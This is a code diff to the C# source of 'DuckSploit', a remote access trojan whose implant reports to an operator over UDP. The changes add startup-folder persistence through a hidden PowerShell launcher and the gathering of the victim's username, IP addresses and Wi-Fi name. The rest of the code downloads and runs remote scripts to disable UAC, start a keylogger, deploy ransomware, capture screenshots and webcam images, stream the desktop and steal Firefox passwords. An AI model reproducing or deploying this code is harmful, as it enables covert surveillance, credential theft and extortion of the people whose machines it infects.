@@ -14,6 +14,7 @@ using System.Text.RegularExpressions;
 using System.Runtime.InteropServices;
 using System.Windows;
 using System.Windows.Forms;
+using System.Reflection;
 
 namespace DuckSploit
 {
@@ -25,14 +26,14 @@ namespace DuckSploit
 			
 			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");			
 			
-			
+			outPath = outPath.Replace("\\", "/");
 			url = '"' + url + '"';
 			
 			outPath = '"' + outPath + '"';
 			
 			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
 			
-			outPath = tempdir + "/download.ps1";
+			outPath = tempdir + "\\download.ps1";
 			
             // open or create file
             FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
@@ -40,7 +41,7 @@ namespace DuckSploit
             StreamWriter streamwrite = new StreamWriter(streamfile);
             // add some lines
 			
-			outPath = '"' + tempdir + "/download.ps1" + '"';
+			outPath = '"' + tempdir + "\\download.ps1" + '"';
 			
 			
 			// string powershelldownloadtxt = "" + url +"\  "
@@ -138,16 +139,14 @@ namespace DuckSploit
 			process.WaitForExit();
 			output = process.StandardOutput.ReadToEnd();
         }
-		
 		public static void host()
 		{
 			string tempdir2 = Path.GetTempPath(); 
 			string output = "";
 			
-			if(Directory.Exists(tempdir2 + "/host"))
+			if(Directory.Exists(tempdir2 + "\\host\\host"))
 			{
-				execute_cmd("start " + tempdir2 + "/host/host/launch.vbs");
-				output = "HOSTING AT http://<victim IP>.";
+				execute_cmd("start " + tempdir2 + "\\host\\host\\launch.vbs");
 			}
 			else
 			{
@@ -155,10 +154,19 @@ namespace DuckSploit
 				Download("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/host/host.zip",tempdir2 + "/host.zip");
 				execute_cmd("powershell Expand-Archive -Path $env:TEMP\\host.zip -DestinationPath $env:TEMP\\host");
 				
-				execute_cmd("start " + tempdir2 + "/host/host/launch.vbs");
-				
-				output = "HOSTING AT http://<victim IP>.";
+				execute_cmd("start " + tempdir2 + "\\host\\host\\launch.vbs");
 			}
+			IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);
+			string username = Environment.UserName;
+			string ipv44 = RemoteIpEndPoint.Address.ToString();
+			string ipv66 = get_ipv6();
+			
+			string text = File.ReadAllText(tempdir2 + "\\host\\host\\pannel\\user_infos.txt");
+			text = text.Replace("Username: <null>", "Username: " + username);
+			text = text.Replace("IPV4: <null>", "IPV4: " + ipv44);
+			text = text.Replace("IPV6: <null>", "IPV6: " + ipv66);
+			text = text.Replace("NetworkIP: <null>", "NetworkSSID: " + get_ssid());
+			File.WriteAllText(tempdir2 + "\\host\\host\\pannel\\user_infos.txt", text);
 		}
 		public static string get_ipv6()
         {
@@ -243,9 +251,10 @@ namespace DuckSploit
 			
 			
 			tempdir = Path.GetTempPath(); 
-			Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/uac/disable.vbs", tempdir + "/uacdisable.vbs");
-			execute_cmd_asadmin("powershell.exe -WindowStyle hidden Start-Process " + tempdir + "/uacdisable.vbs");
+			Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/uac/disable.vbs", tempdir + "\\uacdisable.vbs");
+			execute_cmd_asadmin("powershell.exe -WindowStyle hidden Start-Process " + tempdir + "\\uacdisable.vbs");
 			
+			host();
 			
 			string output = "";
 
@@ -253,7 +262,7 @@ namespace DuckSploit
 
 			try{
 				tempdir = Path.GetTempPath(); 
-				udpClient.Connect("<yourip>", 53);
+				udpClient.Connect("<your ip>", 53);
 
 				Byte[] sendBytes = Encoding.ASCII.GetBytes("Connected!");
 
@@ -293,10 +302,10 @@ namespace DuckSploit
 					{
 						if(result.Length == 3)
 						{
+							output = "This file successfully downloaded to " + result[2];
 							string downloadurl = result[1];
 							string downloadpath = result[2];
 							Download(downloadurl, downloadpath);
-							output = "This file successfully downloaded to " + result[2];
 						}
 						else
 						{
@@ -312,12 +321,10 @@ namespace DuckSploit
 						{
 							if(result[1] == "keylogger")
 							{
-								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/keylogger.vbs", tempdir + "/keylogger.vbs");
-							
 								output = "Keylogger started, see keyloggs at http://{vicitm IP}:8080/keylogger/keylogg.txt";
+								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/keylogger.vbs", tempdir + "\\keylogger.vbs");
 							
 								execute_cmd("start " + tempdir + "\\keylogger.vbs");
-							
 							}
 							else if(result[1] == "--help")
 							{
@@ -325,14 +332,11 @@ namespace DuckSploit
 							}
 							else if(result[1] == "ransomware")
 							{
-								
+								output = "Ransomwared!";
 								// Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/blockmousenkeyboard.ps1", tempdir + "/ransomware2.ps1");
 								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/ransomware.bat", tempdir + "/ransomware.bat");
 								
 								execute_cmd_asadmin("start " + tempdir + "\\ransomware.bat");
-								
-								
-								output = "Ransomwared!";
 							}
 							else
 							{
@@ -346,13 +350,16 @@ namespace DuckSploit
 					}
 					else if(result[0] == "screenshot")
 					{
-						Download("", tempdir + "/screenshot.ps1");
+						output = "A screenshot appears at http://<victim ip>/screenshots";
+						Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/screenshot.ps1", tempdir + "\\screenshot.ps1");
+						execute_cmd("powershell.exe " + tempdir + "\\screenshot.ps1");
 					}
 					else if(result[0] == "webcam_snap")
 					{
-						Download("https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe", tempdir + "/cam.exe");
-						execute_cmd("call " + tempdir + "/cam.exe /filename " + tempdir + "/host/host/pannel/screenshots/webcam_last.png");
+						DateTime dateTime = DateTime.UtcNow.Date;
 						output = "Webcam snap taken! ";
+						Download("https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe", tempdir + "\\cam.exe");
+						execute_cmd("call " + tempdir + "\\cam.exe /filename " + tempdir + "\\host\\host\\pannel\\screenshots\\webcam_" + dateTime.ToString() + ".png");
 					}
 					else if(result[0] == "open")
 					{
@@ -400,9 +407,9 @@ namespace DuckSploit
 					}
 					else if(result[0] == "skull")
 					{
-						Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/troll/skull.bat", tempdir + "/skull.bat");
+						Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/troll/skull.bat", tempdir + "\\skull.bat");
 						output = "A scary Skull with crossbones spawned! ";
-						execute_cmd("start cmd /c \"start " + tempdir + "/skull.bat\"");
+						execute_cmd("start cmd /c \"start " + tempdir + "\\skull.bat\"");
 					}
 					else if(result[0] == "rickroll")
 					{
@@ -412,12 +419,13 @@ namespace DuckSploit
 					else if(result[0] == "uninstall")
 					{
 						output = "[o] Ds is now uninstalled from victim's computer! ";
+						break;
 					}
 					else if(result[0] == "locatemouse")
 					{
-						Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/locatemouse.ps1", tempdir + "/locatemouse.ps1");
-						execute_cmd("(powershell %temp%/locatemouse.ps1) > %temp%/mouselocation.txt");
-						output = File.ReadAllText(tempdir + "/mouselocation.txt");
+						Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/locatemouse.ps1", tempdir + "\\locatemouse.ps1");
+						execute_cmd("(powershell %temp%\\locatemouse.ps1) > %temp%\\mouselocation.txt");
+						output = File.ReadAllText(tempdir + "\\mouselocation.txt");
 					}
 					else if(result[0] == "mouseclick")
 					{
@@ -441,7 +449,7 @@ namespace DuckSploit
 						if(result.Length == 4)
 						{
 							write_txt_to_file(tempdir + "/msg.vbs", "MsgBox \"" + result[2] + "\" & vbCrLf & \"" + result[3] + "\" ,16, \"" + result[1] + "\"");
-							execute(tempdir + "/msg.vbs");
+							execute(tempdir + "\\msg.vbs");
 							output = "Sended message!";
 						}
 						else
@@ -453,12 +461,12 @@ namespace DuckSploit
 					{
 						if(result.Length == 3)
 						{
-							Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/notif.ps1", tempdir + "/notif.ps1");
-							string text = File.ReadAllText(tempdir + "/notif.ps1");
+							Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/notif.ps1", tempdir + "\\notif.ps1");
+							string text = File.ReadAllText(tempdir + "\\notif.ps1");
 							text = text.Replace("<title>", '"' + result[1] + '"');
 							text = text.Replace("<message>", '"' + result[2] + '"');
-							File.WriteAllText(tempdir + "/notif.ps1", text);
-							execute_cmd("powershell " + tempdir + "/notif.ps1");
+							File.WriteAllText(tempdir + "\\notif.ps1", text);
+							execute_cmd("powershell " + tempdir + "\\notif.ps1");
 						}
 						else
 						{
@@ -467,43 +475,101 @@ namespace DuckSploit
 					}
 					else if(result[0] == "desktop_stream")
 					{
-						if(result[1] == "start")
+						if(result.Length == 2)
 						{
-							Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/desktop_stream.ps1", tempdir + "/deskop_stream.ps1");
-							execute_cmd("poweshell " + tempdir + "/deskop_stream.ps1");
-							output = "Desktop stream started at <victim IP>/desktop_stream.html";
+							if(result[1] == "start")
+							{
+								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/desktop_stream.ps1", tempdir + "/deskop_stream.ps1");
+								execute_cmd("poweshell " + tempdir + "/deskop_stream.ps1");
+								output = "Desktop stream started at <victim IP>/desktop_stream.html";
+							}
+							else if(result[1] == "stop")
+							{
+								execute_cmd("taskkill /IM powershell.exe /f");
+								output = "Desktop Stream successfully shuted down! ";
+							}
+						}else{
+							output = "Usage: desktop_stream <start/stop>";
 						}
-						else if(result[1] == "stop")
+					}
+					else if(result[0] == "startup")
+					{
+						if(result.Length == 2)
 						{
-							execute_cmd("taskkill /IM powershell.exe /f");
-							output = "Desktop Stream successfully shuted down! ";
+							if(result[1] == "reload")
+							{
+								output = "Now when victim's computer will reboot/startup he'll reload connection";
+								string appdata = System.Environment.GetEnvironmentVariable("APPDATA");
+								execute_cmd("mkdir \""+appdata+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
+								string execPath = Assembly.GetEntryAssembly().Location;
+								try 
+								{
+									File.Delete(tempdir+"\\ds.exe");
+									File.Copy(execPath, tempdir+"\\ds.exe");
+								}catch (Exception e ) {
+									File.Copy(execPath, tempdir+"\\ds.exe");
+								}
+								write_txt_to_file(appdata+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ds_startup.bat", "@echo off&powershell.exe -WindowStyle hidden %temp%\\ds.exe");
+							}
+							else if(result[1] == "stop")
+							{
+								execute_cmd("taskkill /IM powershell.exe /f");
+								output = "Desktop Stream successfully shuted down! ";
+							}
+						}else{
+							output = "Usage: desktop_stream <start/stop>";
 						}
 					}
 					else if(result[0] == "host")
 					{
-						host();
+						try{
+							if(result[1] == "start")
+							{
+								output = "Hosting system started!";
+								host();
+							}
+							else if(result[1] == "stop")
+							{
+								output = "Hosting system stopped!";
+								execute_cmd("taskkill /IM node.exe /f");
+							}
+							else
+							{
+								output = "Usage: host <start/stop>";
+							}
+						}catch (Exception e ) {
+							output = "Usage: host <start/stop>";
+						}
 					}
 					else if(result[0] == "steal_pwd")
 					{
-						if(result[1] == "firefox")
+						if(result.Length == 2)
 						{
-							execute_cmd("mkdir " + tempdir + "\\firefox_stealing");
-							Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/Find-FirefoxFiles.ps1", tempdir + "/firefox_stealing/Find-FirefoxFiles.ps1");
-							Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/Get-FirefoxPasswords.ps1", tempdir + "/firefox_stealing/Get-FirefoxPasswords.ps1");
-							Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/steal_firefox_passwords.ps1", tempdir + "/firefox_stealing/steal_firefox_passwords.ps1");
-							Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/ConvertFrom-NSS.ps1", tempdir + "/firefox_stealing/ConvertFrom-NSS.ps1");
-							execute_cmd("(powershell.exe %temp%\\firefox_stealing\\steal_firefox_passwords.ps1) > %temp%\\output_firefox.txt");
-							output = File.ReadAllText(tempdir + "/output_firefox.txt");
+							if(result[1] == "firefox")
+							{
+								execute_cmd("mkdir " + tempdir + "\\firefox_stealing");
+								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/Find-FirefoxFiles.ps1", tempdir + "\\firefox_stealing\\Find-FirefoxFiles.ps1");
+								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/Get-FirefoxPasswords.ps1", tempdir + "\\firefox_stealing\\Get-FirefoxPasswords.ps1");
+								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/steal_firefox_passwords.ps1", tempdir + "\\firefox_stealing\\steal_firefox_passwords.ps1");
+								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/ConvertFrom-NSS.ps1", tempdir + "\\firefox_stealing\\ConvertFrom-NSS.ps1");
+								execute_cmd("(powershell.exe %temp%\\firefox_stealing\\steal_firefox_passwords.ps1) > %temp%\\output_firefox.txt");
+								output = File.ReadAllText(tempdir + "\\output_firefox.txt");
+								
+							}
+							else if(result[1] == "google")
+							{
+								output = "will be added soon ;)";
+							}
+							else
+							{
+								output = "Usage: steal_pwd <firefox/google>";
+							}
 							
 						}
 						else
 						{
 							output = "Usage: steal_pwd <firefox/google>";
 						}
-					}
-					else if(result[0] == "host")
-					{
-						host();
 					}
 					else
 					{
@@ -514,7 +580,7 @@ namespace DuckSploit
 							output = "Unknown command \"" + result[0] + "\"";
 						}
 					}
-					
+					output = "\n" + output + "\n";
 					Byte[] outputtobytes = Encoding.ASCII.GetBytes(output);
 					udpClient.Send(outputtobytes, outputtobytes.Length);
 
